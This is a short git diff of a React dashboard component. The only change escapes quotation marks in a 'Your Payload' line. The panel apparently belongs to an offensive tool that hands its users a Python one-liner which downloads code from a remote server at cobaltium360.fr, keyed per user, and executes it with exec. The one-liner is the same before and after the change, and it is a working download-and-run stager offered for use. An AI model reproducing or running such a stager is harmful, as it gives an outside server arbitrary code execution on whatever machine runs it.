@@ -92,7 +92,7 @@ export default function Dashboard() {
           <div className='paylaod_dashboard'>
             <p onClick={test}>Your Payload :</p>
             <div className='container_code_dashboard'>
-              <p className='code_dashboard'>from urllib.request import urlopen;exec(urlopen("https://cobaltium360.fr:3001/api/payload/{data.cle}").read().decode())</p>
+              <p className='code_dashboard'>from urllib.request import urlopen;exec(urlopen(&quot;https://cobaltium360.fr:3001/api/payload/{data.cle}&quot;).read().decode())</p>
             </div>
           </div>
 
